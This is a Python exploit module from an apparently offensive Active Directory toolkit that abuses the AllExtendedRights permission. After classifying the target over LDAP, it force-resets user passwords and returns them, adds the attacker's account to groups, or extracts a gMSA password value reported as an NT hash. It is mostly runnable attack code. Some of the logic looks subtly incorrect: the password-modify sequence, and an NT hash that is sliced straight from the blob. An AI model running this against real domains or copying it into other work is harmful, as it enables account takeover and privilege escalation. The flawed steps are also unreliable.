"""
Module: AllExtendedRights
===========================
Exploit the AllExtendedRights BloodHound edge. AllExtendedRights
grants every extended right on a target object. The actual attack
depends on the target object type:

  User →   ForceChangePassword, User-Force-Change-Password
  Group →  AddMember (self-add via extended right)
  Computer → RBCD configuration
  GMSA →   ReadGMSAPassword (it's an extended right)

This module auto-detects the target type and selects the
appropriate attack.

BloodHound Edge: AllExtendedRights
Attack Vector:   Extended right abuse based on target object type
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.all_extended_rights")


class AllExtendedRights(ExploitModule):
    """
    Exploit AllExtendedRights by auto-detecting the target object
    type and performing the most appropriate attack.

    Attack selection:
      - user / person (msDS-GroupManagedServiceAccount excluded):
          → ForceChangePassword
      - group:
          → AddMembers (self-enrollment)
      - computer:
          → RBCD / shadow credentials
      - msDS-GroupManagedServiceAccount:
          → ReadGMSAPassword
    """

    name: str            = "AllExtendedRights"
    description: str     = (
        "Abuse AllExtendedRights on a target object. Auto-detects object "
        "type and performs: password reset (users), group self-add "
        "(groups), RBCD (computers), or GMSA password read (gMSAs)."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "AllExtendedRights"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#allextendedrights",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    # Extended right GUIDs
    EXT_RIGHTS = {
        "user_change_password":   "00299570-246d-11d0-a768-00aa006e0529",
        "user_force_change_pwd":  "ab721a53-1e2f-11d0-9819-00aa0040529b",
        "self_membership":        "bf9679c0-0de6-11d0-a285-00aa003049e2",
    }

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target",
            display_name="Target Object",
            description="DN, SAM name, or CN of the target object.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="attack",
            display_name="Attack Override",
            description=(
                "Override auto-selected attack: 'auto', 'force_change_password', "
                "'add_self', 'rbcd', 'read_gmsa'."
            ),
            required=False,
            default="auto",
            value_type=str,
            choices=["auto", "force_change_password", "add_self", "rbcd", "read_gmsa"],
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="new_password",
            display_name="New Password",
            description="New password for force_change_password attack.",
            required=False,
            default=None,
            value_type=str,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_and_classify(
        self, name: str, domain: Optional[str]
    ) -> Optional[Dict[str, Any]]:
        """Resolve target name and classify its object type."""
        conn = self.connection

        if "," in name and "=" in name:
            dn = name
        else:
            search_base = self._get_search_base(domain)
            if not search_base:
                return None
            try:
                conn.search(
                    search_base,
                    f"(|(sAMAccountName={name})(cn={name})(dNSHostName={name}))",
                    attributes=["objectClass", "distinguishedName", "sAMAccountName"],
                )
                if not conn.entries:
                    return None
                dn = str(conn.entries[0].distinguishedName)
            except Exception as exc:
                self.logger.error("Resolution failed: %s", exc)
                return None

        # Fetch objectClass from the resolved DN
        try:
            conn.search(
                dn, "(objectClass=*)",
                attributes=["objectClass", "sAMAccountName"],
            )
            if not conn.entries:
                return None
            entry = conn.entries[0]
        except Exception as exc:
            self.logger.error("Classification failed: %s", exc)
            return None

        ocs = [str(c).lower() for c in (entry.objectClass.values if hasattr(entry, "objectClass") else [])]
        sam = str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else ""

        # Classify
        obj_type = "unknown"
        if "msds-groupmanagedserviceaccount" in ocs:
            obj_type = "gmsa"
        elif "computer" in ocs:
            obj_type = "computer"
        elif "group" in ocs:
            obj_type = "group"
        elif "user" in ocs or "person" in ocs:
            obj_type = "user"

        return {
            "dn": dn if "," in name and "=" in name else str(entry.distinguishedName),
            "object_class": ocs,
            "sam": sam,
            "type": obj_type,
        }

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception:
            pass
        return None

    def _select_attack(self, obj_type: str) -> str:
        """Auto-select the best attack based on object type."""
        mapping = {
            "user":     "force_change_password",
            "group":    "add_self",
            "computer": "rbcd",
            "gmsa":     "read_gmsa",
        }
        return mapping.get(obj_type, "force_change_password")

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target = self._opt("target", kwargs)
        if not target:
            return False, "Target object is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        target_name = self._opt("target", kwargs)
        attack_override = self._opt("attack", kwargs)
        domain = self._opt("domain", kwargs)

        # Resolve and classify
        info = self._resolve_and_classify(target_name, domain)
        if not info:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target '{target_name}'.",
            )

        dn = info["dn"]
        obj_type = info["type"]
        sam = info["sam"]

        # Select attack
        if attack_override and attack_override != "auto":
            attack = attack_override
        else:
            attack = self._select_attack(obj_type)

        self.logger.info(
            "[AllExtendedRights] Target: %s (%s) | Attack: %s",
            sam or dn, obj_type, attack,
        )

        # Dispatch
        if attack == "force_change_password":
            return self._attack_password_reset(dn, sam, **kwargs)
        elif attack == "add_self":
            return self._attack_add_self(dn, **kwargs)
        elif attack == "rbcd":
            return self._attack_rbcd(dn, sam, **kwargs)
        elif attack == "read_gmsa":
            return self._attack_read_gmsa(dn, sam)
        else:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Unknown attack: {attack}",
            )

    # ------------------------------------------------------------------ #
    # Sub-attacks
    # ------------------------------------------------------------------ #

    def _attack_password_reset(
        self, target_dn: str, target_sam: str, **kwargs
    ) -> ExploitOutput:
        """Reset the target user's password via LDAP unicodePwd."""
        new_password = self._opt("new_password", kwargs)
        if not new_password:
            import secrets, string
            pool = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            while True:
                new_password = "".join(secrets.choice(pool) for _ in range(20))
                if (any(c.isupper() for c in new_password)
                        and any(c.islower() for c in new_password)
                        and any(c.isdigit() for c in new_password)
                        and any(c in "!@#$%^&*()-_=+" for c in new_password)):
                    break

        encoded = ('"' + new_password + '"').encode("utf-16-le")

        try:
            result = self.connection.modify(
                target_dn,
                {"unicodePwd": [(ldap3.MODIFY_DELETE, [encoded]), (ldap3.MODIFY_ADD, [encoded])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Password reset for '{target_sam}'. New: {new_password}",
                    data={"target_dn": target_dn, "new_password": new_password, "attack": "force_change_password"},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Password reset failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Password reset exception: {exc}",
            )

    def _attack_add_self(self, group_dn: str, **kwargs) -> ExploitOutput:
        """Add the current user to the target group."""
        self_dn = self._get_bound_user_dn()
        if not self_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Cannot determine current user DN.",
            )

        try:
            self.connection.search(group_dn, "(objectClass=*)", attributes=["member"])
            if self.connection.entries and hasattr(self.connection.entries[0], "member"):
                existing = self.connection.entries[0].member.values or []
                if self_dn in existing:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SKIPPED,
                        message="Already a member.",
                    )

            result = self.connection.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_ADD, [self_dn])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Added self to '{group_dn}' via AllExtendedRights.",
                    data={"group_dn": group_dn, "self_dn": self_dn, "attack": "add_self"},
                    rollback_data={"group_dn": group_dn, "principal_dn": self_dn},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Add failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Add self exception: {exc}",
            )

    def _attack_rbcd(
        self, computer_dn: str, computer_sam: str, **kwargs
    ) -> ExploitOutput:
        """Report RBCD capability on the target computer."""
        return ExploitOutput(
            success=True, result_type=ExploitResult.PARTIAL,
            message=(
                f"AllExtendedRights on computer '{computer_sam}' enables RBCD. "
                f"Configure msDS-AllowedToActOnBehalfOfOtherIdentity using "
                f"your RBCD helper module."
            ),
            data={
                "attack": "rbcd",
                "target_computer_dn": computer_dn,
                "required_attribute": "msDS-AllowedToActOnBehalfOfOtherIdentity",
            },
        )

    def _attack_read_gmsa(self, gmsa_dn: str, gmsa_sam: str) -> ExploitOutput:
        """Read the gMSA's managed password."""
        try:
            self.connection.search(
                gmsa_dn, "(objectClass=*)", attributes=["msDS-ManagedPassword"],
            )
            if not self.connection.entries:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Cannot read gMSA '{gmsa_dn}'.",
                )

            entry = self.connection.entries[0]
            if not hasattr(entry, "msDS_ManagedPassword") or not entry.msDS_ManagedPassword.raw_values:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message="No msDS-ManagedPassword returned.",
                )

            blob = entry.msDS_ManagedPassword.raw_values[0]
            nt_hash = blob[0x18:0x28].hex()

            return ExploitOutput(
                success=True, result_type=ExploitResult.SUCCESS,
                message=f"gMSA '{gmsa_sam}' NT Hash: {nt_hash}",
                data={"gmsa": gmsa_sam, "nt_hash": nt_hash, "attack": "read_gmsa"},
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"gMSA read failed: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        group_dn = kwargs.get("group_dn")
        principal_dn = kwargs.get("principal_dn")
        if group_dn and principal_dn:
            try:
                self.connection.modify(
                    group_dn,
                    {"member": [(ldap3.MODIFY_DELETE, [principal_dn])]},
                )
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message="Rolled back group membership.",
                )
            except Exception as exc:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.ERROR,
                    message=f"Rollback failed: {exc}",
                )
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not supported for this sub-attack.",
        )
